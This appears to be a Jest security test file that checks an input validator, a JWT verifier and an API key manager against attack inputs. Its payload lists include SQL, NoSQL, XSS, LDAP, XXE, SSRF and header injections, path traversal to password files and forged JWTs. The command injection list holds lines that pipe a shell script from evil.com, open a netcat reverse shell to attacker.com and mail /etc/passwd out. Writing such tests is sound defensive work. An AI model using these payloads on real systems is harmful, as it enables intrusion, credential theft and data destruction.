const InputValidator = require('../../security/validation/input-validator');
const JWTAuth = require('../../security/api-auth/jwt-auth');
const APIKeyManager = require('../../security/api-auth/api-key');

describe('Security Vulnerability Tests - Injection Prevention', () => {
  let inputValidator, jwtAuth, apiKeyManager;

  beforeEach(() => {
    inputValidator = new InputValidator();
    jwtAuth = new JWTAuth({ secretKey: 'test-secret' });
    apiKeyManager = new APIKeyManager();
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      "1; DELETE FROM users WHERE 1=1; --",
      "' UNION SELECT * FROM passwords --",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' AND 1=CONVERT(int, (SELECT @@version))--",
      "' OR 1=1 LIMIT 1 -- ' ]"
    ];

    it('should detect and prevent SQL injection attempts', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'string');
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Input contains potentially dangerous SQL patterns');
      });
    });

    it('should sanitize SQL injection attempts', () => {
      sqlInjectionPayloads.forEach(payload => {
        const sanitized = inputValidator.sanitize(payload);
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('DELETE');
        expect(sanitized).not.toContain('UNION');
        expect(sanitized).not.toContain('EXEC');
      });
    });
  });

  describe('NoSQL Injection Prevention', () => {
    const noSqlInjectionPayloads = [
      { $ne: null },
      { $gt: "" },
      { $where: "this.password == 'admin'" },
      { username: { $regex: ".*" } },
      { $or: [{ admin: true }, { role: 'admin' }] },
      { "$where": "function() { return true; }" },
      { password: { $exists: true } }
    ];

    it('should detect and prevent NoSQL injection in objects', () => {
      noSqlInjectionPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'object');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => 
          e.includes('MongoDB operator') || 
          e.includes('dangerous patterns')
        )).toBe(true);
      });
    });

    it('should sanitize NoSQL injection attempts', () => {
      const payload = {
        username: "admin",
        password: { $ne: null },
        role: { $exists: true }
      };

      const sanitized = inputValidator.sanitizeObject(payload);
      expect(sanitized.password).not.toHaveProperty('$ne');
      expect(sanitized.role).not.toHaveProperty('$exists');
    });
  });

  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror="alert(\'XSS\')">',
      '<svg onload="alert(document.cookie)">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(`XSS`)">',
      '<input type="text" value="x" onclick="alert(1)">',
      '<body onload="alert(\'XSS\')">',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>document.write(document.cookie)</script>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      '<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=">'
    ];

    it('should detect XSS attempts in strings', () => {
      xssPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'string');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('HTML/Script tags'))).toBe(true);
      });
    });

    it('should sanitize HTML to prevent XSS', () => {
      xssPayloads.forEach(payload => {
        const sanitized = inputValidator.sanitizeHTML(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
      });
    });

    it('should escape special characters for HTML context', () => {
      const dangerous = '<div>&"\'`</div>';
      const escaped = inputValidator.escapeHTML(dangerous);
      expect(escaped).toBe('&lt;div&gt;&amp;&quot;&#x27;&#x60;&lt;/div&gt;');
    });
  });

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '`rm -rf /`',
      '$(whoami)',
      '&& curl evil.com/shell.sh | sh',
      '; nc -e /bin/sh attacker.com 4444',
      '| mail attacker@evil.com < /etc/passwd',
      '\n/bin/bash\n',
      '; python -c "import os; os.system(\'cat /etc/passwd\')"'
    ];

    it('should detect command injection attempts', () => {
      commandInjectionPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'string', {
          pattern: /^[a-zA-Z0-9\s\-_]+$/
        });
        expect(result.isValid).toBe(false);
      });
    });

    it('should prevent shell metacharacters', () => {
      const shellMetachars = ['|', ';', '&', '$', '`', '(', ')', '<', '>', '\n'];
      
      shellMetachars.forEach(char => {
        const result = inputValidator.validate(`test${char}command`, 'filename');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('Invalid filename'))).toBe(true);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
      'C:\\..\\..\\..\\..\\..\\..\\..\\boot.ini',
      '/var/www/../../etc/passwd',
      '....\/....\/....\/etc/passwd'
    ];

    it('should detect path traversal attempts', () => {
      pathTraversalPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'filepath');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => 
          e.includes('Path traversal') || 
          e.includes('Invalid file path')
        )).toBe(true);
      });
    });

    it('should sanitize file paths', () => {
      pathTraversalPayloads.forEach(payload => {
        const sanitized = inputValidator.sanitizePath(payload);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('..\\');
        expect(sanitized).not.toContain('%2e%2e');
      });
    });
  });

  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      '*)(uid=*',
      'admin)(|(uid=*',
      '*)(mail=*@*',
      'admin)(&(password=*',
      '*)(objectClass=*',
      ')(cn=*))(|(cn=*',
      'admin)(password=*))(|(password=*'
    ];

    it('should detect LDAP injection attempts', () => {
      ldapInjectionPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'string', {
          custom: (value) => !value.match(/[*()&|=]/)
        });
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('XML/XXE Injection Prevention', () => {
    const xxePayloads = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>',
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]>',
      '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">',
      '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>'
    ];

    it('should detect XXE injection attempts', () => {
      xxePayloads.forEach(payload => {
        const result = inputValidator.validateXML(payload);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => 
          e.includes('DOCTYPE') || 
          e.includes('ENTITY') ||
          e.includes('Potentially dangerous XML')
        )).toBe(true);
      });
    });
  });

  describe('JWT Security Vulnerabilities', () => {
    it('should reject tokens with none algorithm', () => {
      // Create a token with 'none' algorithm (unsigned)
      const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ userId: 'admin', role: 'admin' })).toString('base64url');
      const maliciousToken = `${header}.${payload}.`;

      const result = jwtAuth.verifyToken(maliciousToken);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('algorithm');
    });

    it('should reject tokens with manipulated algorithm', () => {
      // Try to change HS256 to RS256 (algorithm confusion attack)
      const validToken = jwtAuth.generateToken({ userId: 'user123' });
      const parts = validToken.split('.');
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      header.alg = 'RS256';
      const newHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
      const manipulatedToken = `${newHeader}.${parts[1]}.${parts[2]}`;

      const result = jwtAuth.verifyToken(manipulatedToken);
      expect(result.valid).toBe(false);
    });

    it('should prevent JWT key confusion attacks', () => {
      // Attempt to use public key as HMAC secret
      const publicKey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----';
      
      const maliciousJWT = new JWTAuth({ 
        secretKey: publicKey,
        algorithm: 'HS256' 
      });

      const token = maliciousJWT.generateToken({ userId: 'attacker' });
      const result = jwtAuth.verifyToken(token);
      expect(result.valid).toBe(false);
    });
  });

  describe('API Key Security', () => {
    it('should prevent API key enumeration', () => {
      // Generate multiple keys
      const keys = [];
      for (let i = 0; i < 100; i++) {
        keys.push(apiKeyManager.generateKey(`user${i}`, ['read']).apiKey);
      }

      // Check that keys are sufficiently random
      const uniqueKeys = new Set(keys);
      expect(uniqueKeys.size).toBe(100);

      // Check key entropy
      keys.forEach(key => {
        expect(key.length).toBeGreaterThan(32);
        expect(key).toMatch(/^mcp_[\w-]+$/);
      });
    });

    it('should prevent timing attacks on API key validation', () => {
      const validKey = apiKeyManager.generateKey('user1', ['read']).apiKey;
      const invalidKey = 'mcp_invalid_key_12345';

      // Measure validation times
      const validTimes = [];
      const invalidTimes = [];

      for (let i = 0; i < 10; i++) {
        const start1 = process.hrtime.bigint();
        apiKeyManager.validateKey(validKey);
        const end1 = process.hrtime.bigint();
        validTimes.push(Number(end1 - start1));

        const start2 = process.hrtime.bigint();
        apiKeyManager.validateKey(invalidKey);
        const end2 = process.hrtime.bigint();
        invalidTimes.push(Number(end2 - start2));
      }

      // Average times should be similar (constant time comparison)
      const avgValid = validTimes.reduce((a, b) => a + b) / validTimes.length;
      const avgInvalid = invalidTimes.reduce((a, b) => a + b) / invalidTimes.length;
      const timeDiff = Math.abs(avgValid - avgInvalid);
      
      // Time difference should be minimal
      expect(timeDiff).toBeLessThan(avgValid * 0.5); // Less than 50% difference
    });
  });

  describe('Header Injection Prevention', () => {
    const headerInjectionPayloads = [
      'value\r\nX-Injected: malicious',
      'value\nContent-Type: text/html',
      'value\r\nSet-Cookie: admin=true',
      'value%0d%0aLocation: http://evil.com',
      'value\rX-Auth: bypass'
    ];

    it('should prevent HTTP header injection', () => {
      headerInjectionPayloads.forEach(payload => {
        const result = inputValidator.validate(payload, 'string', {
          custom: (value) => !value.match(/[\r\n]/)
        });
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should prevent prototype pollution via object merge', () => {
      const maliciousPayload = {
        "__proto__": {
          "isAdmin": true
        },
        "constructor": {
          "prototype": {
            "isAdmin": true
          }
        }
      };

      const sanitized = inputValidator.sanitizeObject(maliciousPayload);
      expect(sanitized).not.toHaveProperty('__proto__');
      expect(sanitized).not.toHaveProperty('constructor');
      
      // Verify prototype is not polluted
      const testObj = {};
      expect(testObj.isAdmin).toBeUndefined();
    });

    it('should prevent nested prototype pollution', () => {
      const nestedPayload = {
        user: {
          profile: {
            "__proto__": {
              role: "admin"
            }
          }
        }
      };

      const sanitized = inputValidator.sanitizeObject(nestedPayload, { deep: true });
      expect(sanitized.user.profile).not.toHaveProperty('__proto__');
    });
  });

  describe('SSRF Prevention', () => {
    const ssrfPayloads = [
      'http://localhost:8080/admin',
      'http://127.0.0.1:22',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]:8080',
      'http://0.0.0.0:8080',
      'file:///etc/passwd',
      'gopher://localhost:8080',
      'dict://localhost:11211',
      'http://internal.company.com/secrets'
    ];

    it('should detect SSRF attempts in URLs', () => {
      ssrfPayloads.forEach(payload => {
        const result = inputValidator.validateURL(payload, {
          allowedProtocols: ['http', 'https'],
          blockPrivateIPs: true
        });
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => 
          e.includes('Private IP') || 
          e.includes('Invalid protocol') ||
          e.includes('Potentially dangerous URL')
        )).toBe(true);
      });
    });
  });

  describe('Mass Assignment Prevention', () => {
    it('should prevent mass assignment of sensitive fields', () => {
      const userInput = {
        username: 'newuser',
        email: 'user@example.com',
        role: 'admin', // Should not be allowed
        isVerified: true, // Should not be allowed
        permissions: ['delete_all'], // Should not be allowed
        __proto__: { isAdmin: true }
      };

      const allowedFields = ['username', 'email', 'password'];
      const sanitized = inputValidator.filterAllowedFields(userInput, allowedFields);
      
      expect(sanitized).toHaveProperty('username');
      expect(sanitized).toHaveProperty('email');
      expect(sanitized).not.toHaveProperty('role');
      expect(sanitized).not.toHaveProperty('isVerified');
      expect(sanitized).not.toHaveProperty('permissions');
      expect(sanitized).not.toHaveProperty('__proto__');
    });
  });
});